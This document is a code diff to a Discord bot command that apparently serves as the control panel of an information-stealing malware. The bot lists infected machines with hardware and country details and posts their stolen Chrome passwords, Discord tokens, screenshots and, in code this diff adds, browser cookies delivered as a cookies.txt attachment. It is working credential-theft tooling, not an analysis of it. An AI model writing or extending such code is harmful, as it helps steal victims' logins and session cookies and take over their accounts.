@@ -64,6 +64,11 @@ exports.run = (client, message, args) => {
                         identifier: element.identifier,
                     },
                 });
+                const cookieData = await db.Cookies.findAll({
+                    where: {
+                        identifier: element.identifier,
+                    },
+                });
                 const discordData = await db.Discord.findAll({
                     where: {
                         identifier: element.identifier,
@@ -76,15 +81,19 @@ exports.run = (client, message, args) => {
                 });
 
                 const chromeLength = chromeData.length;
+
+                const cookieLength =
+                    cookieData.length > 0
+                        ? cookieData[0].cookies.split(/HOST/).length
+                        : 0;
+
                 const tokensLength =
                     discordData.length > 0
-                        ? discordData[0].tokens.split(/\r\n|\r|\n/).length - 1
+                        ? discordData[0].tokens.split(/TOKEN/).length
                         : 0;
-                let screenShotPath = "";
 
-                if (screenshotData.length > 0) {
-                    screenShotPath = screenshotData[0].link;
-                }
+                let screenShotPath =
+                    screenshotData.length > 0 ? screenshotData[0].link : "";
 
                 const embed = new Discord.MessageEmbed()
                     .setColor("#0099ff")
@@ -111,7 +120,7 @@ exports.run = (client, message, args) => {
                                 !element.cpuCores ? "Unknown" : element.cpuCores
                             }
                             **Memory**: ${element.memory}
-                            **Available Info**: \`Chrome ${chromeLength}\` \`Discord ${tokensLength}\``,
+                            **Available Info**: \`Chrome ${chromeLength}\` \`Cookies ${cookieLength}\` \`Discord ${tokensLength}\``,
                     })
                     .setThumbnail(
                         `https://www.countryflags.io/${element.countryCode}/flat/64.png`
@@ -157,15 +166,9 @@ exports.run = (client, message, args) => {
                         if (results.length > 0) {
                             let output = "";
                             results.forEach((element, i) => {
-                                if (i == results.length - 1) {
-                                    output =
-                                        output +
-                                        `HOST:${element.host}\nUSERNAME:${element.user}\nPASSWORD:${element.password}\n`;
-                                } else {
-                                    output =
-                                        output +
-                                        `HOST:${element.host}\nUSERNAME:${element.user}\nPASSWORD:${element.password}\n====================================\n`;
-                                }
+                                output =
+                                    output +
+                                    `HOST: ${element.host}\nUSERNAME: ${element.user}\nPASSWORD: ${element.password}\n\n`;
                             });
                             message.channel.send("```" + output + "```");
                         } else {
@@ -201,6 +204,40 @@ exports.run = (client, message, args) => {
                             );
                         } else {
                             message.channel.send("No Discord tokens found");
+                        }
+                    });
+                } else {
+                    message.channel.send("Client not found");
+                }
+            });
+        } else if (args[1] == "cookies") {
+            db.Bots.findAll({
+                where: {
+                    [Op.or]: [
+                        {
+                            id: args[0],
+                        },
+                        {
+                            tag: args[0],
+                        },
+                    ],
+                },
+            }).then(async (result) => {
+                if (result.length > 0) {
+                    db.Cookies.findAll({
+                        where: {
+                            identifier: result[0].identifier,
+                        },
+                    }).then((results) => {
+                        if (results.length > 0) {
+                            message.channel.send(
+                                new Discord.MessageAttachment(
+                                    Buffer.from(results[0].cookies, "utf-8"),
+                                    "cookies.txt"
+                                )
+                            );
+                        } else {
+                            message.channel.send("No Cookies found");
                         }
                     });
                 } else {
